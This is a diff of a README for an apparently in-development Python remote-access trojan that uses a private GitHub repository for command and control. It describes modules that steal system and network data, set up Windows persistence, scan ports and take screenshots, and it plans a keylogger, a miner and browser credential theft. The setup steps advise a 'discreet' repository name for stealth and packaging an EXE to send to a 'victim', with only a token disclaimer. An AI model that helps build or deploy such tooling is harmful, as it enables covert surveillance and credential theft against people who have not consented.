@@ -1,33 +1,102 @@
 # Trojan Project in Progress 🚀
 
-Hi there! 👋 
+Hi there! 👋  
 
-I'm actively working on this project, continuously adding new features and improving its functionalities. Here's what the project currently offers:
+Welcome to the **Trojan Project**, currently in its **beta stage**. This project is under active development and provides various tools and features to interact with a target system for **educational purposes only**. Here's what the project offers and how to set it up:
 
-## Current Features:
+---
+
+## 🔥 Current Features
 - **System Information Retrieval 🖥️**  
-  Gather detailed information about the target's operating system, environment variables, and more.
-  
+  Gather detailed information about the target's operating system and environment variables. This module helps understand the victim's system setup.
+
 - **Directory Lister 📂**  
-  Access and list files and directories in the target's system to explore available data.
-  
+  Explore files and directories in the target's system, enabling navigation through the victim's file system.
+
 - **IP Configuration Stealer 🌐**  
-  Retrieve detailed network configuration data, including IP addresses and active connections.
+  Retrieve detailed network configuration data, including IP addresses, active connections, and public IP information.
 
-## Planned Features:
+- **Windows Auto Start 🛠️**  
+  Automatically configure the program to start with the operating system on Windows devices.
+
+- **Open Ports Scanner 🔍**  
+  Identify open ports on the target Windows system, enabling network-level reconnaissance.
+
+- **Windows Screenshots 📸**  
+  Capture screenshots of the target's desktop on Windows systems. (Currently a work in progress with ongoing improvements.)
+
+
+---
+
+## 🛠 Planned Features
 - **Keylogger 🔑**  
-  Capture keyboard input for monitoring purposes.  
-  
-- **Periodic Screenshots 📸**  
-  Snap regular screenshots to track activity visually.
-  
+  A feature to capture keyboard inputs for monitoring activities.
+
 - **Cryptocurrency Miner 💰**  
-  (If I come up with a genius idea.)
-  
+  Integrate a mining tool if I come up with a brilliant implementation plan.
+
 - **Browser Data Extraction 🔐**  
-  Access stored credentials, saved passwords, and browsing history.
+  Extract saved credentials, passwords, and browsing history from common web browsers.
 
-## Disclaimer:
-This project is for **educational purposes only**. Unauthorized use of this software may violate laws and regulations. Always ensure you have permission before deploying or testing on any system.
+---
 
-Stay tuned for updates as the project evolves! 🌟
+## ⚙️ How It Works
+### **Project Structure**
+The project follows this structure for modularity and ease of development:
+
+```
+├── config
+│   └── abc.json
+├── main.py
+├── modules
+│   ├── autostart.py
+│   ├── dirlister.py
+│   ├── environment.py
+│   ├── gitimporter.py
+│   ├── ipstealer.py
+│   ├── mytoken.txt
+│   ├── openports.py
+│   ├── screenshot.py
+│   └── trojan.py
+├── README.md
+└── requirements.txt
+```
+
+---
+
+### **Setting Up**
+To ensure the project works seamlessly:
+1. Navigate to the `modules` directory and create a file named `mytoken.txt`.
+   - Inside this file, paste your **GitHub personal access token** for authentication.  
+   - Learn how to create a token [here](https://github.com/settings/tokens).
+
+2. Modify the `gitimporter.py` file to use your GitHub username and private repository name:  
+
+```python
+# Set your GitHub username
+user = 'Rskladanek'  # Replace with your GitHub username
+
+# Log in to GitHub using the token
+sess = github3.login(token=token)
+
+# Return the repository object
+return sess.repository(user, 'Trojan')  # Replace 'Trojan' with your repository name
+```
+
+3. Create a private repository with a discreet name (avoid names like "Trojan" to maintain stealth).
+
+---
+
+### **Future Deployment**
+Once all changes are made:
+- **Generate an EXE file**: You’ll convert the project into an executable file that can be shared with your "victim". (Deployment instructions coming soon.)
+- Customize the repository name and user credentials to ensure privacy and security.
+
+---
+
+## ⚠️ Disclaimer
+This project is strictly for **educational purposes only**. Unauthorized use of this software is illegal and violates laws and regulations. Always ensure you have explicit permission before deploying or testing this tool.
+
+---
+
+Stay tuned for updates! 🌟 Let’s keep it safe and "Smurf-tastic"! 😉
